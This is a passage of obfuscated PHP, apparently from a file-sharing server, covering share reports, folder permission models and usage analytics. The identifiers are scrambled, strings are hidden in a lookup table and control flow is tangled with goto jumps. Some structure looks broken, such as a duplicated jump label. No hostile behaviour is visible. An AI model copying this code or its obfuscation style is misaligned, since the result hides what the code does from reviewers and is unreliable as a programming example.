C˚Ι; f匃: $aϑ =& $_SERVER[ԥ]; if ($e[$aϑ[442]] != $aϑ[83]) { return; } $B˳Ũ = $f􌶸[$aϑ[387]][$aϑ[365]]; goto FÈƃ; C˚Ι: } private function _folderReport($c) { goto FʄŌ; Eӭ: $Aӡ = array_to_keyvalue($F˗, $cם[33], $cם[28]); $Aӡ[] = $Aɭ[$cם[28]]; return implode($cם[8], $Aӡ); goto B﷾; f: $Cˋꕊ = array($cם[415] => array($cם[7], $aȞ), $cם[455] => array($cם[743], "\x25{$B}\x25"), $cם[393] => 0); $Aɭ = Model($cם[744])->where($Cˋꕊ)->field($cם[2201])->find(); if (!$Aɭ) { return !1; } goto B˭ջ; FʄŌ: $cם =& $_SERVER[ԥ]; $Cˋꕊ = array($cם[415] => array($cם[911], 0), $cם[673] => 3); $aȞ = Model($cם[2200])->where($Cˋꕊ)->field($cם[415])->select(); goto F͈; F͈: if (!$aȞ) { return !1; } $aȞ = array_to_keyvalue($aȞ, $cם[33], $cם[415]); $B = $cם[47] . $c . $cם[47]; goto f; B˭ջ: $Dܰ = substr($Aɭ[$cם[455]], strpos($Aɭ[$cם[455]], $B)); $Cˋꕊ = array($cם[365] => array($cם[7], trim($Dܰ, $cם[47]))); $F˗ = Model($cם[744])->where($Cˋꕊ)->field($cם[28])->select(); goto Eӭ; B﷾: } protected function remove($D򂫅) { goto CߚǮ; CߚǮ: $EƼ =& $_SERVER[ԥ]; if (is_array($D򂫅)) { $D򂫅 = array($EƼ[7], $D򂫅); } $fй = array($EƼ[437] => $D򂫅); goto bٟ; fܾ: for ($A쫧 = 0; $A쫧 < count($dӘ); $A쫧++) { $d뒼 = $this->getInfo($dӘ[$A쫧]); if ($d뒼[$EƼ[444]] == $EƼ[83]) { Model($EƼ[501])->eventShare($d뒼[$EƼ[365]], $EƼ[2187]); } if ($d뒼[$EƼ[442]] == $EƼ[83]) { Model($EƼ[501])->eventShare($d뒼[$EƼ[365]], $EƼ[2186]); } } return $fׅ; goto eƄ; bٟ: $fׅ = $this->where($fй)->delete(); if ($fׅ) { Model($EƼ[533])->where(array($EƼ[437] => $D򂫅))->delete(); } $dӘ = is_array($D򂫅) ? $D򂫅[1] : array($D򂫅); goto fܾ; eƄ: } protected function removeBySource($Ȇ) { goto E; E: $A =& $_SERVER[ԥ]; $A煃 = array($A[379] => array($A[380], $Ȇ)); $A = $this->field($A[437])->where($A煃)->select(); goto f׌̵; e: $this->where($A煃)->delete(); Model($A[533])->where($A煃)->delete(); goto c͇; f׌̵: $A = array_to_keyvalue($A, $A[33], $A[437]); if (!$A) { return; } $A煃 = array($A[436] => array($A[380], $A)); goto e; c͇: } public function listAll($Fԇʌ) { goto A; eǂ: if ($Fԇʌ[$b[686]]) { $C޴͌ = $Fԇʌ[$b[687]] ? $Fԇʌ[$b[687]] : strtotime(date($b[2202])); $f[$b[183]] = array($b[317], array($Fԇʌ[$b[686]], $C޴͌)); } if ($Fԇʌ[$b[29]]) { $f[$Fԇʌ[$b[29]]] = 1; } else { $f[] = array($b[442] => array($b[911], 0), $b[444] => array($b[911], 0), $b[2177] => $b[2146]); } if ($Fԇʌ[$b[2142]]) { $f[] = array($b[439] => $Fԇʌ[$b[2142]], $b[1312] => array($b[743], "\45{$Fԇʌ[$b[2142]]}\45"), $b[2177] => $b[2146]); } goto f˥; A: $b =& $_SERVER[ԥ]; $f = array(); if ($Fԇʌ[$b[1404]]) { $f[$b[1404]] = $Fԇʌ[$b[1404]]; } goto eǂ; Fۙȴ: return $bу; goto aޜֺ; f˥: $bу = $this->_makeOrder()->where($f)->selectPage(20); if (empty($bу[$b[350]])) { return array(); } $this->_listDataApply($bу[$b[350]]); goto Fۙȴ; aޜֺ: } public function listDataApply($A͑) { $this->_listDataApply($A͑); return $A͑; } private function _listDataApply(&$F) { $fҐ =& $_SERVER[ԥ]; $F烇 = array_to_keyvalue($F, $fҐ[33], $fҐ[1404]); $b = Model($fҐ[473])->userListInfo(array_unique($F烇)); $C΢ۣ = array_to_keyvalue($F, $fҐ[33], $fҐ[365]); $b뗓 = Model($fҐ[744])->sourceListInfo($C΢ۣ, !0); foreach ($F as &$F) { $Aэ = $F[$fҐ[1404]]; $F[$fҐ[2203]] = $b[$Aэ] ? $b[$Aэ] : !1; $dʗ = $F[$fҐ[365]]; $F[$fҐ[387]] = $b뗓[$dʗ] ? $b뗓[$dʗ] : !1; } } private function _makeOrder($FɲП = '') { goto ḋ; Aӌ: $D = Input::get($Fǲ[403], $Fǲ[7], $Fǲ[385], $Eߵ); $Eא = Input::get($Fǲ[404], $Fǲ[7], $Fǲ[2204], array($Fǲ[2141], $Fǲ[400])); $Eא = $c[$Eא]; goto d˝; d˝: $FɲП = $FɲП . "{$D}\x20{$Eא}"; return $this->order($FɲП); goto cؒķ; ḋ: $Fǲ =& $_SERVER[ԥ]; $Eߵ = array($Fǲ[183], $Fǲ[687], $Fǲ[2189], $Fǲ[2190]); $c = array($Fǲ[398] => $Fǲ[399], $Fǲ[400] => $Fǲ[401]); goto Aӌ; cؒķ: } public function reportAdd($A) { $f٧ =& $_SERVER[ԥ]; $C = array($f٧[437] => $A[$f٧[437]], $f٧[1404] => USER_ID); if (Model($f٧[2200])->where($C)->find()) { return !1; } $c䫹 = array($f٧[437] => $A[$f٧[437]], $f٧[1312] => $A[$f٧[1312]], $f٧[365] => $A[$f٧[365]], $f٧[415] => $A[$f٧[415]], $f٧[1404] => USER_ID, $f٧[29] => $A[$f٧[29]], $f٧[401] => $A[$f٧[401]]); return Model($f٧[2200])->add($c䫹); } public function reportList($Bٳ) { goto B֋Œ; f: if (empty($a۪埢[$a[350]])) { return array(); } $this->_listDataApply($a۪埢[$a[350]]); return $a۪埢; goto dԦո; B֋Œ: $a =& $_SERVER[ԥ]; $Fꧮ = array(); if ($Bٳ[$a[686]]) { $aވ׋ = $Bٳ[$a[687]] ? $Bٳ[$a[687]] : strtotime(date($a[2202])); $Fꧮ[$a[183]] = array($a[317], array($Bٳ[$a[686]], $aވ׋)); } goto F׈; d: $d = array($a[398] => $a[399], $a[400] => $a[401]); $eʵ = $a[2208] . $d[$Aߦ]; $a۪埢 = Model($a[2200])->where($Fꧮ)->order($eʵ)->selectPage(20); goto f; F׈: if (isset($Bٳ[$a[29]]) && in_array($Bٳ[$a[29]], array($a[83], $a[2205], $a[2206], $a[2207], $a[1882]))) { $Fꧮ[$a[29]] = $Bٳ[$a[29]]; } if (isset($Bٳ[$a[673]]) && in_array($Bٳ[$a[673]], array($a[464], $a[83], $a[2205], $a[2206]))) { $Fꧮ[$a[673]] = $Bٳ[$a[673]]; } $Aߦ = Input::get($a[404], $a[7], $a[2204], array($a[2141], $a[400])); goto d; dԦո: } public function reportStatus($fݿ) { goto F; ảà: $Eݩ = Model($a΄[2200])->where($fɓ)->save($d); if ($fݿ[$a΄[673]] == $a΄[2205]) { if ($a[$a΄[415]] != $a΄[464] && $this->shareFileMeta($a[$a΄[415]])) { $this->shareFileMeta($a[$a΄[415]], 0); } $this->remove($a[$a΄[437]]); return !0; } if ($Eݩ && $fݿ[$a΄[673]] == $a΄[2206]) { $E˿ʃ = $d[$a΄[673]] == $a΄[2206] ? 1 : 0; $this->shareFileMeta($a[$a΄[415]], $E˿ʃ); $this->removeByFile($a[$a΄[415]]); } goto A؋; A؋: return $Eݩ; goto B; F: $a΄ =& $_SERVER[ԥ]; $fɓ = array($a΄[363] => $fݿ[$a΄[363]]); $a = Model($a΄[2200])->where($fɓ)->field($a΄[2209])->find(); goto dٜ; dٜ: if (!$a) { return !1; } $d = array($a΄[673] => $fݿ[$a΄[673]]); if ($fݿ[$a΄[673]] == $a΄[2206] && $a[$a΄[673]] == $a΄[2206]) { $d[$a΄[673]] = 0; } goto ảà; B: } private function removeByFile($D̟) { goto EܳȆ; D: $C = array_to_keyvalue($Aׅ, $bȨґ[33], $bȨґ[437]); $this->remove($C); goto cՃŇ; D⯘: $e = array($bȨґ[365] => array($bȨґ[7], $Aḡ), $bȨґ[442] => 1); $Aׅ = Model($bȨґ[2043])->where($e)->field($bȨґ[437])->select(); if (empty($Aׅ)) { return; } goto D; EܳȆ: $bȨґ =& $_SERVER[ԥ]; $Aׅ = Model($bȨґ[744])->where(array($bȨґ[415] => $D̟))->field($bȨґ[365])->select(); $Aḡ = array_to_keyvalue($Aׅ, $bȨґ[33], $bȨґ[365]); goto D⯘; cՃŇ: } private function shareFileMeta($a좈, $cƴʮ = null) { $F񺯣 =& $_SERVER[ԥ]; $eᑷ = array($F񺯣[415] => $a좈, $F񺯣[89] => $F񺯣[2210]); if (is_null($cƴʮ)) { return Model($F񺯣[2211])->where($eᑷ)->find(); } $eᑷ[$F񺯣[355]] = $cƴʮ; Model($F񺯣[2211])->add($eᑷ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\x63\x65\x5f\141\165\x74\x68"; public function getAuth($Fݨ) { goto B͉ۗ; c: return $Dؓ; goto B; B͉ۗ: $aΪȆ =& $_SERVER[ԥ]; $f = $aΪȆ[2212]; $F҄ = array($aΪȆ[365] => $Fݨ); goto B󇚇; B󇚇: $b = $this->field($f)->order($aΪȆ[363])->where($F҄)->select(); $Dؓ = array(); foreach ($b as $f) { if (Model($aΪȆ[2213])->listData($f[$aΪȆ[2194]])) { $Dؓ[] = $f; } } goto c; B: } public function setAuth($a򈵰, $B) { goto B߄ʗ; B߄ʗ: $a =& $_SERVER[ԥ]; $E = Model($a[1093])->sourceInfo($a򈵰); if ($E[$a[367]] != SourceModel::TYPE_GROUP) { return !1; } goto aӍ; aӍ: $d𠖂 = 1; $d = $E[$a[452]]; if ($d != $d𠖂) { $Eͳ = array($a[2066] => $d); $fٷ = Model($a[2140])->field($a[1404])->where($Eͳ)->select(); $fٷ = array_to_keyvalue($fٷ, $a[33], $a[1404]); } goto dѓ; dѓ: $bܭ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a㧉 = array(); foreach ($B as $D) { if (!in_array($D[$a[367]], $bܭ)) { show_json(LNG($a[2214]), !1); } if ($d != $d𠖂) { if ($D[$a[367]] == SourceModel::TYPE_GROUP) { } if ($D[$a[452]] != 0 && !in_array($D[$a[452]], $fٷ)) { } } if ($D[$a[452]] == 0) { $D[$a[367]] = SourceModel::TYPE_USER; } $a㧉[] = array($a[365] => $a򈵰, $a[367] => intval($D[$a[367]]), $a[452] => intval($D[$a[452]]), $a[2194] => intval($D[$a[2194]]) ? intval($D[$a[2194]]) : 0, $a[2195] => intval($D[$a[2195]]) ? intval($D[$a[2195]]) : -1); } goto Eٔ; Eٔ: $this->where(array($a[379] => $a򈵰))->delete(); $this->addAll($a㧉); return !0; goto b֓; b֓: } public function authClear($d֮) { $DȘ핛 =& $_SERVER[ԥ]; $E֥҆ = Model($DȘ핛[1093])->sourceInfo($d֮); $dэʓ = array($d֮); if ($E֥҆[$DȘ핛[366]] == $DȘ핛[83]) { $c = array($DȘ핛[521] => array($DȘ핛[479], $E֥҆[$DȘ핛[455]] . $d֮ . $DȘ핛[480])); $dэʓ = Model($DȘ핛[1093])->field($DȘ핛[379])->where($c)->getField($DȘ핛[365], !0); $dэʓ[] = $d֮; } $this->where(array($DȘ핛[379] => array($DȘ핛[380], $dэʓ)))->delete(); return !0; } public function get($e) { $dԹ鄱 = $this->getSourceList(array($e), !0); return $dԹ鄱[0]; } public function getSourceList($D餇, $bߠ = false) { goto f; Dȗ: $A = array(); foreach ($bߠ as $fⴳ => $aڄ) { $A[$fⴳ] = $this->makeSourceAuth($aڄ, $Fņ); } return $A; goto C҉; f峓: $A荭 = array($fᨂ[379] => array($fᨂ[380], $e)); $Fņ = $this->field($Eخ)->where($A荭)->select(); $Fņ = array_to_keyvalue_group($Fņ, $fᨂ[365]); goto Dȗ; f: $fᨂ =& $_SERVER[ԥ]; if (!$D餇) { return array(); } $D߿㧠 = Model($fᨂ[1093]); goto f; Cۑ: $e = array_values(array_unique($e)); if (!$e) { return array(); } $Eخ = $fᨂ[2216]; goto f峓; f: if (!$bߠ) { $A荭 = array($fᨂ[379] => array($fᨂ[380], $D餇)); $bߠ = $D߿㧠->field($fᨂ[2215])->where($A荭)->select(); $bߠ = array_to_keyvalue($bߠ, $fᨂ[365]); } $e = $D餇; foreach ($bߠ as $Cʕ => $F) { $B = $D߿㧠->parentLevelArray($F[$fᨂ[455]]); $e = array_merge($e, $B, array($Cʕ)); } goto Cۑ; C҉: } public function authDeepCheck($Eٽ핸, $c = false) { $B嶌 =& $_SERVER[ԥ]; if (_get($GLOBALS, $B嶌[453])) { return !1; } $bܑ = $this->makeAuthDeep(); if (!in_array($Eٽ핸, $bܑ)) { return !1; } return array($B嶌[373] => -1, $B嶌[414] => array($B嶌[381] => $B嶌[1014], $B嶌[2072] => $B嶌[464], $B嶌[382] => LNG($B嶌[2217]), $B嶌[2084] => $B嶌[2218]), $B嶌[2219] => array($B嶌[384] => $B嶌[2220], $B嶌[75] => $Eٽ핸)); } protected function makeAuthDeep() { goto b; B: $dƸ = array_values(array_unique($dƸ)); foreach ($dƸ as $dҟ) { $Eͅ = $bҠ->getInfo($dҟ); $C[] = $Eͅ[$e׉ǉ[387]][$e׉ǉ[365]]; } $C = array_values(array_unique($C)); goto f鿮ΐ; b: $e׉ǉ =& $_SERVER[ԥ]; static $C = false; if ($C) { return $C; } goto cՃ; A܇: $b澑 = Model($e׉ǉ[1093]); $bҠ = Model($e׉ǉ[454]); if ($FΒ) { $E = $b澑->where(array($e׉ǉ[365] => array($e׉ǉ[380], $FΒ)))->select(); foreach ($E as $c) { $Dݷ = $b澑->parentLevelArray($c[$e׉ǉ[455]]); $C = array_merge($C, $Dݷ); $dƸ[] = $c[$e׉ǉ[452]]; } } goto B푓; f鿮ΐ: return $C; goto Aё; aϳ: $aɋ = Session::get($e׉ǉ[2178]); $aɋ = array_to_keyvalue($aɋ, $e׉ǉ[33], $e׉ǉ[2066]); $dªח = array($e׉ǉ[367] => SourceModel::TYPE_USER, $e׉ǉ[452] => USER_ID); goto Bا; Bا: if ($aɋ) { $dªח = array(array($e׉ǉ[367] => SourceModel::TYPE_USER, $e׉ǉ[452] => USER_ID), array($e׉ǉ[367] => SourceModel::TYPE_GROUP, $e׉ǉ[452] => array($e׉ǉ[380], $aɋ)), $e׉ǉ[899] => $e׉ǉ[2146]); } if ($BѸ) { $dªח = array($dªח, $e׉ǉ[2194] => array($e׉ǉ[2222], $BѸ)); } $B = $this->field($e׉ǉ[2223])->where($dªח)->select(); goto Cӳ; B푓: $dƸ = array_values(array_unique($dƸ)); $eɌ = $dƸ; foreach ($eɌ as $dҟ) { $Eͅ = $bҠ->getInfo($dҟ); $Dݷ = $b澑->parentLevelArray($Eͅ[$e׉ǉ[455]]); $dƸ = array_merge($dƸ, $Dݷ); } goto B; cՃ: $AǗ = Model($e׉ǉ[2221])->listData(); $BѸ = array(); foreach ($AǗ as $cػ) { if ($cػ[$e׉ǉ[372]] == 0 && $cػ[$e׉ǉ[2086]] == $e׉ǉ[83]) { $BѸ[] = $cػ[$e׉ǉ[363]]; } } goto aϳ; Cӳ: $FΒ = array_to_keyvalue($B, $e׉ǉ[33], $e׉ǉ[365]); $C = array(); $dƸ = $aɋ; goto A܇; Aё: } private function makeSourceAuth($a嵘Ќ, $A) { goto D; A: $a = $F[83]; $bʻ = Model($F[1093])->parentLevelArray($a嵘Ќ[$F[455]]); $bʻ = array_merge(array($a嵘Ќ[$F[365]]), array_reverse($bʻ)); goto E񉠊; E񉠊: $D㎛ = !1; foreach ($bʻ as $aҢչ) { if (!isset($A[$aҢչ])) { continue; } $D = $this->authMake($A[$aҢչ]); if ($D[$F[414]]) { $D㎛ = $D; break; } } if (!$D㎛ && $a嵘Ќ[$F[367]] == SourceModel::TYPE_GROUP) { $Fކ = $a嵘Ќ[$F[452]]; if (isset($cŅѩ[$Fކ])) { $D = $cŅѩ[$Fކ]; $BŃ֣ = Model($F[454])->getInfo($Fކ); $D㎛ = array($F[2224] => intval($D[$F[372]][$F[372]]), $F[2225] => $D[$F[372]], $F[2219] => array($F[384] => $F[2226], $F[75] => $BŃ֣[$F[387]][$F[365]], $F[2227] => $BŃ֣[$F[459]])); } } goto c; c: if (!$D㎛ && $a嵘Ќ[$F[367]] == SourceModel::TYPE_GROUP) { $BŃ֣ = Model($F[454])->getInfo($a嵘Ќ[$F[452]]); $B߇ = explode($F[47], trim($dí[$F[455]], $F[47])); foreach ($B߇ as $Fކ) { if ($Fކ == $F[464] || $Fކ == $a) { continue; } if (!isset($cŅѩ[$Fކ])) { continue; } $D = $cŅѩ[$Fކ]; $D㎛ = array($F[2224] => intval($D[$F[372]][$F[372]]), $F[2225] => $D[$F[372]], $F[2219] => array($F[384] => $F[2228], $F[2229] => $BŃ֣[$F[387]][$F[365]], $F[2227] => $BŃ֣[$F[459]])); break; } } if ((!$D㎛ || $D㎛[$F[373]] <= 0) && $a嵘Ќ[$F[367]] == SourceModel::TYPE_GROUP) { $f = $this->authDeepCheck($a嵘Ќ[$F[365]], $D㎛); if ($f) { $D㎛ = $f; } } return $D㎛; goto B܊; D: $F =& $_SERVER[ԥ]; $cŅѩ = Session::get($F[2178]); $cŅѩ = array_to_keyvalue($cŅѩ, $F[2066]); goto A; B܊: } public function authOwnerApply($e۸) { goto aڮ; f: if (count($E) == 0) { $E = $this->authFolderOwnerGroup($e۸[$c[452]]); } $E = array_unique($E); if (AuthModel::authCheckRoot($e۸[$c[372]][$c[373]])) { $E[] = USER_ID; } goto FꗹԽ; aڮ: $c =& $_SERVER[ԥ]; if (empty($e۸[$c[372]]) || isset($e۸[$c[2230]]) && $e۸[$c[2230]]) { return $e۸; } if (AuthModel::authCheckRoot($e۸[$c[372]][$c[373]])) { return $e۸; } goto eє; eє: $B = Model($c[1093])->parentLevelArray($e۸[$c[455]]); $B = array_merge(array($e۸[$c[365]]), array_reverse($B)); $AȤ悃 = $c[2216]; goto CՏ; E: $aӍ = array(); $E = array(); foreach ($bǜő as $c೔ => $eħي) { $Cڒܙ = $this->authFolderOwnerUser($eħي); $aӍ[$c೔] = $Cڒܙ; $E = array_merge($E, $Cڒܙ[$c[531]]); if ($Cڒܙ[$c[2231]]) { break; } } goto f; CՏ: $C = array($c[379] => array($c[380], $B)); $bǜő = $this->field($AȤ悃)->where($C)->select(); $bǜő = array_to_keyvalue_group($bǜő, $c[365]); goto E; FꗹԽ: $e۸[$c[372]][$c[2232]] = Model($c[470])->userListInfo($E); return $e۸; goto B; B: } private function authFolderOwnerGroup($bό) { $fŬ =& $_SERVER[ԥ]; $cӶٵ = Model($fŬ[2140])->where(array($fŬ[2066] => $bό))->select(); $e܎ = array(); if (!$cӶٵ) { return $e܎; } foreach ($cӶٵ as $b⟎) { $B۪ = $this->authInfo($b⟎); if (AuthModel::authCheckRoot($B۪[$fŬ[372]])) { $e܎[] = $b⟎[$fŬ[1404]]; } } return $e܎; } private function authFolderOwnerUser($Dׅ) { $e =& $_SERVER[ԥ]; $B = array(); $Bҩˉ = !1; foreach ($Dׅ as $Fд) { $Cݥݛ = $this->authInfo($Fд); if ($Fд[$e[452]] == $e[464]) { $Bҩˉ = !0; } if ($Fд[$e[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Cݥݛ[$e[372]])) { $B[] = $Fд[$e[452]]; } } } return array($e[531] => $B, $e[2231] => $Bҩˉ); } public function authMake($f) { goto Fۋⅅ; C: $aӍ = $aސ ? $d܃ : ($F̾ ? $F͛ : $b); $Bي = $aސ ? $c圔 : ($F̾ ? $d㑵˶ : $f؉); $Fݍ­ = $aސ ? $e뺒ނ[2233] : ($F̾ ? $e뺒ނ[2234] : ($a笇 ? $e뺒ނ[2235] : $e뺒ނ[357])); goto añ䋉; b: $c謃܅ = array_to_keyvalue($A, $e뺒ނ[33], $e뺒ނ[2066]); $d܃ = 0; $F͛ = 0; goto A; Dަ: $f؉ = 0; $aސ = 0; $F̾ = 0; goto F݉; Fۋⅅ: $e뺒ނ =& $_SERVER[ԥ]; if (!$f) { return array($e뺒ނ[373] => 0, $e뺒ނ[414] => !1); } $A = Session::get($e뺒ނ[2178]); goto b; añ䋉: $FȠ = array($e뺒ނ[2224] => intval($aӍ), $e뺒ނ[2225] => $Bي, $e뺒ނ[2219] => array($e뺒ނ[384] => $Fݍ­, $e뺒ނ[75] => $dƝ[$e뺒ނ[365]])); return $FȠ; goto f; A: $b = 0; $c圔 = 0; $d㑵˶ = 0; goto Dަ; F݉: $a笇 = 0; $dƝ = array($e뺒ނ[365] => 0); foreach ($f as $dƝ) { $Bي = $this->authInfo($dƝ); $f劒 = $dƝ[$e뺒ނ[452]]; $DԓɃ = intval($Bي[$e뺒ނ[372]]); if ($dƝ[$e뺒ނ[367]] == SourceModel::TYPE_USER && $f劒 == USER_ID) { $aސ = !0; $c圔 = $Bي; $d܃ = $DԓɃ; } else { if ($dƝ[$e뺒ނ[367]] == SourceModel::TYPE_GROUP && in_array($f劒, $c謃܅)) { $F̾ = !0; if ($DԓɃ >= $F͛) { $F͛ = $DԓɃ; $d㑵˶ = $Bي; } } else { if ($f劒 == $e뺒ނ[464]) { $a笇 = !0; $f؉ = $Bي; $b = $DԓɃ; } } } } goto C; f: } public function authTargetInfoMake($a) { goto B; C煨: return array($aӈ[2236] => $d, $aӈ[2227] => $e); goto dϦ; B: $aӈ =& $_SERVER[ԥ]; $d = array(); $e = array(); goto aٹ; aٹ: foreach ($a as $Cڊ) { if ($Cڊ[$aӈ[367]] == SourceModel::TYPE_USER) { $d[] = intval($Cڊ[$aӈ[452]]); } else { if ($Cڊ[$aӈ[367]] == SourceModel::TYPE_GROUP) { $e[] = intval($Cڊ[$aӈ[452]]); } } } if ($d) { $d = Model($aӈ[470])->userListInfo($d); } if ($e) { $Bڽ = array($aӈ[2138] => array($aӈ[380], $e)); $e = Model($aӈ[454])->field($aӈ[2151])->where($Bڽ)->select(); $e = array_to_keyvalue($e, $aӈ[2066]); } goto C煨; dϦ: } private function authInfo($Ḋ׺) { $cѐ =& $_SERVER[ԥ]; if ($Ḋ׺[$cѐ[2194]]) { $a锟 = Model($cѐ[2213])->listData($Ḋ׺[$cѐ[2194]]); if (!$a锟) { return !1; $cɤ = Model($cѐ[2213])->listData(); $aϲՄ = array_filter_by_field($cɤ, $cѐ[372], $cѐ[464]); return $aϲՄ; } $FɆ = array_field_key($a锟, array($cѐ[363], $cѐ[28], $cѐ[372], $cѐ[2084], $cѐ[2087])); $FɆ[$cѐ[2237]] = $Ḋ׺; return $FɆ; } else { return array($cѐ[381] => 0, $cѐ[2072] => $Ḋ׺[$cѐ[2195]], $cѐ[382] => $cѐ[33], $cѐ[2084] => $cѐ[2238]); } } } goto Aʆ; C: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($cگʈ) { $EË =& $_SERVER[ԥ]; $eϴ = array($EË[531] => array($EË[29] => $EË[1992], $EË[257] => array($EË[206], $EË[684], $EË[1993], $EË[1994])), $EË[1995] => array($EË[29] => $EË[1996], $EË[257] => array($EË[206], $EË[682], $EË[1997], $EË[1998], $EË[1999]))); if (!isset($eϴ[$cگʈ])) { return !1; } $this->optionType = $eϴ[$cگʈ][$EË[29]]; $this->field = $eϴ[$cگʈ][$EË[257]]; return !0; } public function listData($Eޫʧ = false, $d = "\x6d\157\144\151\146\171\124\x69\155\145", $AЂϜ = false) { return parent::listData($Eޫʧ, $d, $AЂϜ); } public function trendList($BҼߠ) { goto e; fӫ: if (!isset($c֛)) { $Aȉ = $BҼߠ == $Dڳ[531] ? $Dڳ[473] : $Dڳ[744]; $c֛ = Model($Aȉ)->min($Dڳ[183]); } $E盃 = $Dڳ[2002] . ucfirst($BҼߠ); $DՄʉی = $this->dateList($c֛); goto cŏ; cŏ: foreach ($DՄʉی as $A) { $this->{$E盃}($A); } return $this->listData(); goto cЃڊ; e: $Dڳ =& $_SERVER[ԥ]; $a沞 = $this->listData(); if ($a沞) { $A׳ = end($a沞); $A = date($Dڳ[2000], strtotime($Dڳ[2001])); if ($A׳[$Dڳ[206]] == $A) { return $a沞; } $c֛ = strtotime($A׳[$Dڳ[206]]); } goto fӫ; cЃڊ: } private function dateList($cޫ) { $c˴ =& $_SERVER[ԥ]; $d内 = $cޫ; $C߈䴌 = strtotime($c˴[2001]); $dծ = array(); while ($d内 <= $C߈䴌) { $dծ[] = date($c˴[2000], $d内); $d内 = strtotime($c˴[2003], $d内); } return $dծ; } public function _recordUser($d㚾 = '') { goto E; E: $A齼 =& $_SERVER[ԥ]; $f = strtotime(date($A齼[2004], strtotime($d㚾))); $Aڐߓ = strtotime(date($A齼[2005], strtotime($d㚾))); goto a; a: $Aѧ = array($A齼[183] => array($A齼[912], $Aڐߓ)); $fډ֭և = Model($A齼[473])->where($Aѧ)->count($A齼[1404]); $Aѧ[$A齼[183]] = array($A齼[317], array($f, $Aڐߓ)); goto C; Fȶ: $eŐ = array($A齼[206] => $d㚾, $A齼[684] => (int) $fډ֭և, $A齼[1993] => (int) $a֢裤, $A齼[1994] => (int) $a); return $this->insert($eŐ); goto D; C: $a֢裤 = Model($A齼[473])->where($Aѧ)->count($A齼[1404]); $Aѧ[$A齼[29]] = $A齼[2006]; $a = Model($A齼[2007])->where($Aѧ)->count($A齼[2008]); goto Fȶ; D: } public function _recordStore($eӅ = '') { goto E; f˺Ղ: $Eރ[$e[367]] = 1; $f = Model($e[744])->where($Eރ)->sum($e[77]); $Eރ[$e[367]] = 2; goto a֯; E: $e =& $_SERVER[ԥ]; $C = strtotime(date($e[2005], strtotime($eӅ))); $Eރ = array($e[183] => array($e[912], $C)); goto eζҊ; eζҊ: $FҲ = Model($e[418])->where($Eރ)->sum($e[77]); $Eރ[$e[366]] = 0; $A㇍ƈ = Model($e[744])->where($Eރ)->sum($e[77]); goto f˺Ղ; a֯: $F؊ъ = Model($e[744])->where($Eރ)->sum($e[77]); $fʳ = array($e[206] => $eӅ, $e[682] => (int) $A㇍ƈ, $e[1997] => (int) $FҲ, $e[1998] => (int) $f, $e[1999] => (int) $F؊ъ); return $this->insert($fʳ); goto b; b: } public function trend($cՌ, $dݤґ) { goto e⮎; Aɓ: return $D՚; goto cɵ; cﶄ: if (empty($d΍)) { $b = date($E򆄝[2000], strtotime($E򆄝[2001])); $Fϥ = array($E򆄝[206] => $b); foreach ($d؎Я[$cՌ] as $Bޞ߇ => $fԲ) { $Fϥ[$Bޞ߇] = 0; } $d΍[] = $Fϥ; } $D՚ = array(); foreach ($d΍ as $fԲ) { if ($cՌ == $E򆄝[1995] && $fԲ[$E򆄝[1997]] > $fԲ[$E򆄝[682]]) { $fԲ[$E򆄝[1997]] = $fԲ[$E򆄝[682]]; } foreach ($d؎Я[$cՌ] as $Bޞ߇ => $b) { $e۲ = array($E򆄝[206] => $fԲ[$E򆄝[206]], $E򆄝[1312] => $b); $e۲[$Fܪ[$cՌ]] = isset($fԲ[$Bޞ߇]) ? $fԲ[$Bޞ߇] : 0; $D՚[] = $e۲; } } goto Aɓ; e⮎: $E򆄝 =& $_SERVER[ԥ]; if (!$this->init($cՌ)) { return !1; } $d΍ = $this->trendList($cՌ); goto c؉; c؉: if ($d΍ && $dݤґ != $E򆄝[1379]) { $Bذ = $d΍[0][$E򆄝[206]]; $e = $this->validDate($dݤґ, $Bذ); $eؘ = array(); $b¼ = array_to_keyvalue($d΍, $E򆄝[206]); foreach ($e as $b) { if (isset($b¼[$b])) { $e۲ = $b¼[$b]; } else { $e۲ = end($d΍); $e۲[$E򆄝[206]] = $b; if ($cՌ == $E򆄝[531]) { $e۲[$E򆄝[1993]] = $e۲[$E򆄝[1994]] = 0; } } $eؘ[] = $e۲; } $d΍ = $eؘ; } $d؎Я = array($E򆄝[531] => array($E򆄝[684] => LNG($E򆄝[2009]), $E򆄝[1993] => LNG($E򆄝[2010]), $E򆄝[1994] => LNG($E򆄝[2011])), $E򆄝[1995] => array($E򆄝[682] => LNG($E򆄝[2012]), $E򆄝[1997] => LNG($E򆄝[2013]), $E򆄝[1998] => LNG($E򆄝[2014]), $E򆄝[1999] => LNG($E򆄝[2015]))); $Fܪ = array($E򆄝[531] => $E򆄝[2016], $E򆄝[1995] => $E򆄝[77]); goto cﶄ; cɵ: } public function validDate($C, $bǺ) { goto c; DՇ: switch ($C) { case $C[1386]: $b = mktime(0, 0, 0, date($C[2017]), date($C[2018]) - date($C[1201]) + 7 - 7, date($C[2019])); $Bֵ = 0; do { $cۏء = date($C[2000], $b - 3600 * 24 * 7 * $Bֵ); $Fŝ[] = $cۏء; $Bֵ++; } while ($bǺ < $cۏء); break; case $C[1384]: $Bֵ = 1; do { $E錿 = date($C[2020], strtotime("\55\40{$Bֵ}\x20\155\157\156\164\x68\x73")); $Fŝ[] = $E錿; $Bֵ++; } while ($bǺ < $E錿); break; case $C[1688]: $aӢʯ = (int) date($C[2019], strtotime($bǺ)); $cܸԔ = (int) date($C[2019]); if ($aӢʯ >= $cܸԔ) { break; } for ($aӢʯ; $aӢʯ < $cܸԔ; $aӢʯ++) { $Fŝ[] = $aӢʯ . $C[2021]; } break; default: break; } if ($bǺ > end($Fŝ)) { array_pop($Fŝ); } sort($Fŝ); goto Bƾ; c: $C =& $_SERVER[ԥ]; $B = date($C[2000], strtotime($C[2001])); $Fŝ = array($B); goto DՇ; Bƾ: return $Fŝ; goto d麜; d麜: } public function listTable($CΞ) { $bΕݶ = ucfirst($CΞ); return Model($bΕݶ)->listData(); } public function option($c) { $B = $_SERVER[ԥ][2022] . ucfirst($c); return $this->{$B}(); } private function optionUser() { goto aѻů; cԃ: $c靹 = Model($Aԋ[473])->where($aǥ⠜)->count($Aԋ[1404]); return array($Aԋ[679] => (int) $aʵ, $Aԋ[2026] => (int) 